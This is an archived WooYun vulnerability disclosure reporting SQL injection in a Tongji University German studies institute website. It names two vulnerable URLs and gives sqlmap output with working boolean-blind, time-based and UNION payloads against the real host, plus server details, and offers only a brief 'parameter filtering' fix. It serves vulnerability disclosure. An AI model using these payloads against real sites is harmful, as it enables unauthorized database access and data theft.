wybug_title: 同济大学德意志联邦共和国问题研究所SQL注射
wybug_status: 已交由第三方合作机构(CCERT教育网应急响应组)处理
wybug_detail:
漏洞详情 披露状态：   									2014-06-09：	细节已通知厂商并且等待厂商处理中									2014-06-10：	厂商已经确认，细节仅向厂商公开									2014-06-20：	细节向核心白帽子及相关领域专家公开									2014-06-30：	细节向普通白帽子公开									2014-07-10：	细节向实习白帽子公开									2014-07-24：	细节向公众公开  简要描述： 同济大学德意志联邦共和国问题研究所SQL注射 详细说明：  http://dgyj.tongji.edu.cn/contentUs.aspx?cuid=1http://dgyj.tongji.edu.cn/NewsDetalied.aspx?nid=205   漏洞证明：  Place: GETParameter: cuid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cuid=1' AND 2149=2149 AND 'jdqZ'='jdqZ    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: cuid=1' AND 9900=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7) AND 'rbRz'='rbRz---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: cuid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: cuid=1' AND 2149=2149 AND 'jdqZ'='jdqZ    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase AND time-based blind (heavy query)    Payload: cuid=1' AND 9900=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysuserssqlmap identified the following injection points with a total of 71 HTTP(s) requests:---Place: GETParameter: nid    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: nid=205' AND 2831=2831 AND 'lQuW'='lQuW    Type: UNION query    Title: Generic UNION query (NULL) - 7 columns    Payload: nid=-1745' UNION ALL SELECT NULL,NULL,CHAR(113)+CHAR(113)+CHAR(114)+CHAR(98)+CHAR(113)+CHAR(73)+CHAR(97)+CHAR(111)+CHAR(85)+CHAR(82)+CHAR(97)+CHAR(118)+CHAR(105)+CHAR(83)+CHAR(107)+CHAR(113)+CHAR(108)+CHAR(104)+CHAR(109)+CHAR(113),NULL,NULL,NULL,NULL-- ---web server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Microsoft SQL Server 2005

跑表慢 但可以跑 CTRL+C了   修复方案：  参数过滤。   版权声明：转载请注明来源 Hotler0o@乌云
